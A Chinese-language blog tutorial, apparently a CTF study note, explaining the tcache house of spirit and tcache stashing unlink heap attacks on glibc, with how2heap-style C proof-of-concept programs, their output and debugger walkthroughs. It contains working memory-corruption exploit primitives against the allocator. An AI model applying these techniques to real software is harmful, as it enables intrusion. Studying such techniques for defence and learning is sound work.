<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">调用<span class="built_in">malloc</span>()一次，以便它设置它的内存。</span><br><span class="line">让我们假设我们将覆盖<span class="number">1</span>个指针指向一个假块区域。</span><br><span class="line">这个区域包含一个假块。它的大小字段位于<span class="number">0x7fffbc746cf8</span></span><br><span class="line">这个块大小必须属于tcache类别(chunk.size&lt;= <span class="number">0x410</span>;Malloc arg &lt;= <span class="number">0x408</span> 在x64)。PREV_INUSE (lsb)位被空闲的tcache块忽略，但是is_mmap(第二个lsb)和NON_MAIN_ARENA(第三个lsb)位会导致问题。</span><br><span class="line">．.． 请注意，这必须是下一个<span class="built_in">malloc</span>请求的大小，四舍五入到<span class="built_in">malloc</span>实现使用的内部大小。例如，在x64上，<span class="number">0x30</span><span class="number">-0x38</span>将全部四舍五入到<span class="number">0x40</span>，所以它们将在最后为<span class="built_in">malloc</span>参数工作。</span><br><span class="line">现在，我们将用第一个假块中的假区域地址<span class="number">0x7fffbc746cf8</span>重写指针。</span><br><span class="line">．.． 请注意，与这个块相关联的*region*的内存地址必须是<span class="number">16</span>字节对齐的。</span><br><span class="line">释放被覆盖的指针。</span><br><span class="line">现在，下一个<span class="built_in">malloc</span>将返回我们的假块在<span class="number">0x7fffbc746cf8</span>的区域，它将是<span class="number">0x7fffbc746d00</span>!</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x30</span>): <span class="number">0x7fffbc746d00</span></span><br></pre></td></tr></table></figure>

<p>首先创建一个数组</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354221.png" alt="image-20220409170620115"></p>
<p>修改数组的index1为0x40（chunk size）</p>
<p>然后把数组的 index2 的地址赋给了 a，之后去 free a，再去申请回来的话就会把 a 申请回来，这样就申请了 fake chunks[2] 那里</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354222.png" alt="image-20220409170731307"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354223.png" alt="image-20220409170823492"></p>
<h5 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h5><p>在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。</p>
<h5 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h5><p>这种攻击利用的是tcache bin中有剩余的chunk（小于TCACHE_MAX_BINS），同大小的small bin会放入tcache 中（这种情况可用<strong>calloc</strong>分配同大小的块触发，因为<strong>calloc</strong>分配堆块时不从tcache bin中获取），在在获取到一个 <code>smallbin</code> 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个 small bin 的 bk 指针时，其可以在任意地址上写一个 libc 地址 (类似 <code>unsorted bin attack</code> 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。</p>
<p>我们按照释放的先后顺序称 <code>smallbin[size]</code> 中的两个 chunk 分别为 chunk0 和 chunk1。我们修改 chunk1 的 <code>bk</code> 为 <code>fake_chunk_addr</code>。同时还要在 <code>fake_chunk_addr-&gt;bk</code> 处提前写一个可写地址 <code>writable_addr</code> 。调用 <code>calloc(size-0x10)</code> 的时候会返回给用户 chunk0 (这是因为 smallbin 的 <code>FIFO</code> 分配机制)，假设 <code>tcache[sz]</code> 中有 5 个空闲堆块，则有足够的位置容纳 <code>chunk1</code> 以及 <code>fake_chunk</code> 。在源码的检查中，只对第一个 chunk 的链表完整性做了检测 <code>__glibc_unlikely (bck-&gt;fd != victim)</code> ，后续堆块在放入过程中并没有检测。同时，由于 <code>bin-&gt;bk = bck;bck-&gt;fd = bin;</code> 的 unlink 操作，会使得 <code>writable_addr+0x10</code> 处被写入一个 libc 地址。</p>
<p>因为 tcache 的分配机制是 <code>LIFO</code> ，所以位于 <code>chunk1-&gt;bk</code> 指针处的 <code>fake_chunk</code> 在链入 tcache 的时候反而会放到链表表头。在下一次调用 <code>malloc(size-0x10)</code> 时会返回 <code>fake_chunk+0x10</code> 给用户</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"> <span class="number">4</span> </span><br><span class="line"> <span class="number">5</span> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="number">6</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> <span class="number">7</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> <span class="number">8</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"> <span class="number">9</span> </span><br><span class="line"><span class="number">10</span>     setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">11</span> </span><br><span class="line"><span class="number">12</span>     <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line"><span class="number">13</span>     <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line"><span class="number">14</span>     <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable add    ress to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line"><span class="number">15</span>     <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line"><span class="number">16</span>     <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"><span class="number">17</span> </span><br><span class="line"><span class="number">18</span>     <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line"><span class="number">19</span>     <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line"><span class="number">20</span>     <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x1    0) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"><span class="number">21</span> </span><br><span class="line"><span class="number">22</span>     stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"><span class="number">23</span> </span><br><span class="line"><span class="number">24</span>     <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line"><span class="number">25</span>     <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"><span class="number">26</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"><span class="number">27</span> </span><br><span class="line"><span class="number">28</span>     <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line"><span class="number">29</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="number">30</span>         chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">31</span>     &#125;</span><br><span class="line"><span class="number">32</span> </span><br><span class="line"><span class="number">33</span>     <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line"><span class="number">34</span>     <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one     after another malloc.\n\n&quot;</span>);</span><br><span class="line"><span class="number">35</span> </span><br><span class="line"><span class="number">36</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="number">37</span>         <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line"><span class="number">38</span>     &#125;</span><br><span class="line"><span class="number">39</span> </span><br><span class="line"><span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"><span class="number">41</span> </span><br><span class="line"><span class="number">42</span>     <span class="comment">//last tcache bin</span></span><br><span class="line"><span class="number">43</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line"><span class="number">44</span>     <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line"><span class="number">45</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line"><span class="number">46</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"><span class="number">47</span> </span><br><span class="line"><span class="number">48</span>     <span class="comment">//convert into small bin</span></span><br><span class="line"><span class="number">49</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"><span class="number">50</span> </span><br><span class="line"><span class="number">51</span>     <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"><span class="number">52</span> </span><br><span class="line"><span class="number">53</span>     <span class="comment">//now 5 tcache bins</span></span><br><span class="line"><span class="number">54</span>     <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"><span class="number">55</span> </span><br><span class="line"><span class="number">56</span>     <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">57</span>     <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">58</span> </span><br><span class="line"><span class="number">59</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"><span class="number">60</span> </span><br><span class="line"><span class="number">61</span>     <span class="comment">//change victim-&gt;bck</span></span><br><span class="line"><span class="number">62</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"><span class="number">63</span>     chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line"><span class="number">64</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"><span class="number">65</span> </span><br><span class="line"><span class="number">66</span>     <span class="comment">//trigger the attack</span></span><br><span class="line"><span class="number">67</span>     <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>    );</span><br><span class="line"><span class="number">68</span> </span><br><span class="line"><span class="number">69</span>     <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"><span class="number">70</span> </span><br><span class="line"><span class="number">71</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(    <span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"><span class="number">72</span> </span><br><span class="line"><span class="number">73</span>     <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line"><span class="number">74</span>     target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">75</span> </span><br><span class="line"><span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"><span class="number">77</span> </span><br><span class="line"><span class="number">78</span>     assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"><span class="number">79</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">80</span> &#125;</span><br><span class="line">                                                                    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">这个文件演示了对tcache的隐藏断开链接攻击。</span><br><span class="line">这个poc已经在glibc <span class="number">2.27</span>和glibc <span class="number">2.29</span>上测试过。</span><br><span class="line">当您能够覆盖victim-&gt;bk指针时，可以使用这种技术。此外，至少一次使用<span class="built_in">calloc</span>来分配一个块是必要的。最后，我们需要一个可写地址来绕过glibc中的检查</span><br><span class="line">glibc中将smallbin放入tcache的机制让我们有机会发起攻击。</span><br><span class="line">这种技术允许我们将libc addr写入任何我们想要的地方，并在任何我们需要的地方创建一个假块。在本例中，我们将在堆栈上创建块。</span><br><span class="line">Stack_var模拟我们想要分配的假块。</span><br><span class="line">首先，让我们将一个可写地址写入fake_chunk-&gt;bk，以绕过glibc中的bck-&gt;fd = bin。这里我们选择stack_var[<span class="number">2</span>]的地址作为fake bk，稍后我们可以看到*(fake_chunk-&gt;bk + <span class="number">0x10</span>)，即stack_var[<span class="number">4</span>]，将是攻击后的libc addr。</span><br><span class="line">可以看到fake_chunk-&gt;bk的值是:<span class="number">0x7ffed2ac1c20</span></span><br><span class="line">同样，让我们看看stack_var[<span class="number">4</span>]的初始值:(nil)</span><br><span class="line">现在我们用<span class="built_in">malloc</span>分配了<span class="number">9</span>个块。</span><br><span class="line">然后我们释放其中<span class="number">7</span>个，把它们放到tcache中。我们很小心地没有释放像chunk2到chunk9这样的一系列块，因为一个 unsorted bin挨着另一个会在另一个<span class="built_in">malloc</span>后被合并成一个。</span><br><span class="line">如你所见，chunk1和[chunk3,chunk8]被放入tcache容器中，而chunk0和chunk2将被放入未排序的容器中。</span><br><span class="line">现在，我们分配了一个大于<span class="number">0x90</span>的块来将chunk0和chunk2放入small bin中。</span><br><span class="line">然后我们<span class="built_in">malloc</span>两个chunk，以便为small bins留出空间。在那之后，我们现在有<span class="number">5</span>个tcache容器和<span class="number">2</span>个small bin</span><br><span class="line">现在我们模拟一个漏洞，该漏洞可以将victim-&gt;bk指针覆盖到fake_chunk addr: <span class="number">0x7ffed2ac1c10</span>中。</span><br><span class="line">最后，我们用<span class="built_in">calloc</span>分配一个<span class="number">0x90</span>块来触发攻击。之前释放的small bin将被返回给user，另一个和fake_chunk被链接到tcache bins。</span><br><span class="line">现在我们的fake chunk已经被放入tcache bin[<span class="number">0xa0</span>] <span class="built_in">list</span> 中。它的fd指针现在指向下一个空闲块:<span class="number">0x55bf4d36c3a0</span>和 bck-&gt;fd已被更改为libc addr: <span class="number">0x7f20de7d7d30</span></span><br><span class="line">如您所见，下一个<span class="built_in">malloc</span>(<span class="number">0x90</span>)将返回我们的fake chunk区域:<span class="number">0x7ffed2ac1c20</span></span><br></pre></td></tr></table></figure>

<p>首先我们在19行下断点，查看各个变量的地址</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354224.png" alt="image-20220410151507709"></p>
<p>接下来我们将断点下在第22行，使程序执行<code>stack_var[3] = (unsigned long)(&amp;stack_var[2]);</code>这段代码：<img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354225.png" alt="tcache"></p>
<p>接下来我们将断点下在第39行，执行malloc和free后：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354226.png" alt="image-20220410153929625"></p>
<p>第二个for循环中起始释放的chunk的下标为3，所以释放是从第4个chunk（<strong>即chunk3</strong>）开始的。这里注意看链表中其实只有6个被释放块，但是tcache链表存放被释放块数量的最大值为7，所以此时tcache并不是满状态。</p>
<p>接下来将断点下在第47行，依序释放chunk_lis[1]、chunk_lis[0]、chunk_lis[2]，我们再来看一下bin中的情况：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354227.png" alt="image-20220410154830570"></p>
<p>可以看到在释放chunk_lis[1]的时候chunk1作为最后一个进入tcache的chunk填满了整条链表，接下来再继续释放size为0xa0的堆块的话就不会在进入此条单向链表了。由于chunk_lis[0]、chunk_lis[2]中malloc指向的chunk的size都为0xa0，所以超过fastbin max size，所以会进入unsorted bin中，上图可以看到此时chunk0与chunk2已经进入了unsorted bin中。</p>
<p>接下来我们将断点下在第52行，申请一块size为0xb0大小的chunk，我们在看一下bin中的情况</p>
<p>由于unsorted bin存取机制的原因，如果此时申请一个size为0xb0大小的chunk，unsorted bin中如果没有符合chunk size的空闲块（chunk3、chunk1的size小于0xb0），那么unsorted bin中的空闲块chunk3和chunk1会按照size落在small bin的0xa0链表中。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354228.png" alt="image-20220410155828098"></p>
<p>接下来我们将断点下在第58行，完成两次申请size为0xa0大小的chunk</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354229.png" alt="image-20220410160043359"></p>
<p>分配走了chunk1和chunk7，现在tcache 中存在5个空闲块，small bin 中存在2个空闲块</p>
<p>接着将断点下在65行，执行<code>chunk_lis[2][1] = (unsigned long)stack_var;</code>这条语句：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354230.png" alt="image-20220410160704024"></p>
<p>chunk_lis中存储的指针指向chunk的data user部分，所以chunk_list[2] [1]就是chunk2的bk，即将chunk2的bk指向stack_var,所以，stack_var会被认为是紧跟着chunk2之后释放的一个chunk：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354231.png" alt="image-20220410160914734"></p>
<p>之前我们修改了stack_var的bk指针指向stack_var[2]</p>
<p>这里借用一下<a target="_blank" rel="noopener" href="https://hollk.blog.csdn.net/article/details/113604261?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_antiscanv2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_antiscanv2&utm_relevant_index=2">holk师傅的图</a></p>
<p><img src="https://img-blog.csdnimg.cn/20210203213127691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>接下来我们断点在70行，调用调用calloc函数申请一个size为0xa0大小的chunk：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354232.png" alt="image-20220410161423590"></p>
<p>calloc申请size为<code>0xa0</code>大小的chunk的时候就会直接从<code>small bin</code>中获取，那么由于small bin是FIFO先进先出机制，所以这里被重新启用的是chunk0</p>
<p>在获取到一个smallbin中的一个 chunk 后会如果 tcache 仍有足够空闲位置（tcache中有两个位置，chunk2和stack_var刚好够落在这两个位置），剩下的 smallbin 从最后一个stack_var(0x7ffffffdc600)开始顺着bk链接到 tcachebin 中 ，在这个过程中只对第一个 chunk2进行了完整性检查，后面的stack_var的检查缺失。这样一来就造成上图的效果，stack_var就被挂进了tcache bin的链表中.注意到的是small bin中bk指针指向的是chunk head（即chunk 开始部分），而tcache的next指针指向chunk 的user data，所以stack_var加入tcahce bin中后指针指向stack_var+10.</p>
<p>同时由于 small bin放入tcache过程中，存在bin-&gt;bk = bck;bck-&gt;fd = bin;的unlink操作<code>bck-&gt;fd = bin ，即</code>将bin的值写到了<code>*(bck+0x10)</code>，我们可以将bck伪造为<code>target_addr-0x10</code>（target即为stack_var[2])，bin为<code>libc</code>相关地址，则可以向stack_var<a href="%E5%8D%B3target_addr">4</a>写入<code>bin</code>，攻击结果和<code>unsored bin attack</code>的结果类似。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354233.png" alt="image-20220410163626544"></p>
<p>最后将断点下在第76行，将会申请一个size为<code>0xa0</code>大小的chunk，并将其指针赋给target变量</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354234.png" alt="image-20220410162131878"></p>

    </article>
    <!-- license -->
    
    <!-- paginator -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
